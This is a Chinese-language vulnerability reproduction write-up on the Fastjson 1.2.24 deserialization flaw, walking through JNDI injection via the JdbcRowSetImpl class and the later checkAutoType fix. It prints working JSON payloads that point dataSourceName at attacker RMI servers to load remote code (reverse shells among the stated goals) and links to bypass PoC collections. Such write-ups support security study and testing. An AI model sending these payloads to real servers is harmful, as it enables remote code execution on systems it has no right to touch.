## **小于等于1.2.24版本**
请求包的请求体JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来把JSON内容反序列化成@type指定的对象，并且会调用这个对象的setter或者getter方法。
此时@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。

常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法，在执行时会触发JNDI注入支持，传入一个rmi的源或ldap源，只要解析其中的url就会支持远程调用，
因此整个漏洞复现的原理过程就是：
```
1. 攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，
以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。
2. 存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，
靶机服务器就会向rmi服务器请求待执行的命令。
也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？
3. rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，
提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），
得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell等）
4. rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。
5. 靶机服务器执行了恶意代码，被攻击者成功利用。
```
```
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://47.109.58.205:1099/cpuw3a",
    "autoCommit":"true"
}

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.43.14:6666/Object","autoCommit":true}
```
![](https://img-bc.icode.best/26de9fc36b2940c6882491c5453db571.png)



在 Fastjson1.2.25 中使用了 checkAutoType 来修复1.2.22-1.2.24中的漏洞，其中有个 autoTypeSupport 默认为 False。当 autoTypeSupport 为 False 时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。当 autoTypeSupport 为 True 时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。对于开启或者不开启，都有相应的绕过方法。​

^
## **其他绕过和利用链**

<https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md>

<https://github.com/safe6Sec/Fastjson>

主流版本利用：https\://www\.freebuf.com/vuls/361576.html\




